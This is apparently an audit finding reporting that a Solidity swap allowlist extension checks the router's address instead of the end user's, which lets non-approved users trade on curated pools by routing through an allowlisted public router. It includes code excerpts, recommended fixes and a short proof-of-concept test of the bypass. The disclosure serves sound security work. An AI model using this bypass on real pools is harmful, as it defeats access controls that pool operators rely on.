### Title
SwapAllowlistExtension Checks Router Address Instead of Actual User, Enabling Allowlist Bypass Through MetricOmmSimpleRouter - (File: metric-periphery/contracts/extensions/SwapAllowlistExtension.sol)

---

### Summary

`SwapAllowlistExtension.beforeSwap` gates swaps by checking the `sender` argument, which the pool sets to `msg.sender` of the `swap` call. When a user routes through `MetricOmmSimpleRouter`, `msg.sender` at the pool is the **router contract**, not the end user. If the pool admin allowlists the router (which is required for any allowlisted user to use the router), every non-allowlisted user can bypass the curation gate by routing through the same public router.

---

### Finding Description

**Step 1 – Pool passes `msg.sender` as `sender` to the extension.**

In `MetricOmmPool.swap`, the pool calls `_beforeSwap` with its own `msg.sender`: [1](#0-0) 

`ExtensionCalling._beforeSwap` then ABI-encodes that value as the first argument to every configured extension: [2](#0-1) 

**Step 2 – `SwapAllowlistExtension` checks that `sender` argument.**

```solidity
function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external view override returns (bytes4)
{
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
        revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    ...
}
``` [3](#0-2) 

`msg.sender` inside the extension is the pool; `sender` is whoever called `pool.swap`.

**Step 3 – The router calls `pool.swap` directly, substituting itself as `sender`.**

`MetricOmmSimpleRouter.exactInputSingle` calls `pool.swap(...)` with no user-identity forwarding: [4](#0-3) 

So when a user calls `router.exactInputSingle(...)`, the pool receives `msg.sender = router`, and the extension evaluates `allowedSwapper[pool][router]` — not `allowedSwapper[pool][actual_user]`.

**Step 4 – The dilemma that creates the bypass.**

A pool admin who wants allowlisted users to be able to use the router must add the router to the allowlist:

```
allowedSwapper[pool][router] = true
```

Once that entry exists, **any** user — allowlisted or not — can call `router.exactInputSingle(...)` and the extension will pass, because it only sees the router address. The `MetricOmmSimpleRouter` has no per-user access control of its own. [5](#0-4) 

The same applies to `exactInput`, `exactOutputSingle`, and `exactOutput`.

---

### Impact Explanation

The `SwapAllowlistExtension` is documented as gating "`swap` by swapper address, per pool." Its intended invariant is that only explicitly approved addresses may trade on a curated pool. When the router is used, the checked identity is the router contract, not the end user. A pool admin who allowlists the router to enable approved users to trade through it simultaneously opens the gate to every non-approved user. This is a **curation failure**: the allowlist no longer enforces the intended access policy, and any user can execute swaps on a pool that was designed to be restricted.

---

### Likelihood Explanation

The bypass requires the pool admin to have added the router to the allowlist. This is a natural operational step: without it, even approved users cannot use the router (the extension would reject the router address). Any curated pool that intends to support router-based trading will reach this state. The trigger is a normal, unprivileged call to `MetricOmmSimpleRouter.exactInputSingle` (or any other router entry point) by a non-approved user.

---

### Recommendation

The extension must gate the **economic actor** (the end user), not the transport layer (the router). Two approaches:

1. **Router-side forwarding**: Have the router pass the original `msg.sender` through `extensionData`, and update `SwapAllowlistExtension.beforeSwap` to decode and check that value when present.

2. **Extension-side fallback**: If `sender` is a known router (or any contract), decode the actual user from `extensionData` and check that address instead.

Either way, the allowlist lookup must resolve to the address that initiated the transaction, not the intermediate contract that called the pool.

---

### Proof of Concept

```solidity
// Pool is configured with SwapAllowlistExtension.
// Admin allowlists only `approvedUser` and the router (so approvedUser can trade via router).
swapExtension.setAllowedToSwap(address(pool), approvedUser, true);
swapExtension.setAllowedToSwap(address(pool), address(router), true);

// Liquidity is present.
// bannedUser is NOT in the allowlist.

vm.startPrank(bannedUser);
token1.approve(address(router), type(uint256).max);

// Direct call to pool.swap reverts — extension sees bannedUser, not allowlisted.
vm.expectRevert(IMetricOmmPoolActions.NotAllowedToSwap.selector);
pool.swap(bannedUser, false, int128(1000), type(uint128).max, "", "");

// Router call succeeds — extension sees router address, which IS allowlisted.
// bannedUser bypasses the curation gate.
router.exactInputSingle(
    IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        recipient: bannedUser,
        tokenIn: address(token1),
        zeroForOne: false,
        amountIn: 1000,
        amountOutMinimum: 0,
        priceLimitX64: type(uint128).max,
        deadline: block.timestamp,
        extensionData: ""
    })
);
// Swap executes successfully — allowlist bypassed.
vm.stopPrank();
```

### Citations

**File:** metric-core/contracts/MetricOmmPool.sol (L230-240)
```text
    _beforeSwap(
      msg.sender,
      recipient,
      zeroForOne,
      amountSpecified,
      priceLimitX64,
      packedSlot0Initial,
      bidPriceX64,
      askPriceX64,
      extensionData
    );
```

**File:** metric-core/contracts/ExtensionCalling.sol (L160-177)
```text
    _callExtensionsInOrder(
      BEFORE_SWAP_ORDER,
      abi.encodeCall(
        IMetricOmmExtensions.beforeSwap,
        (
          sender,
          recipient,
          zeroForOne,
          amountSpecified,
          priceLimitX64,
          packedSlot0Initial,
          bidPriceX64,
          askPriceX64,
          extensionData
        )
      )
    );
  }
```

**File:** metric-periphery/contracts/extensions/SwapAllowlistExtension.sol (L31-41)
```text
  function beforeSwap(address sender, address, bool, int128, uint128, uint256, uint128, uint128, bytes calldata)
    external
    view
    override
    returns (bytes4)
  {
    if (!allowAllSwappers[msg.sender] && !allowedSwapper[msg.sender][sender]) {
      revert IMetricOmmPoolActions.NotAllowedToSwap();
    }
    return IMetricOmmExtensions.beforeSwap.selector;
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```
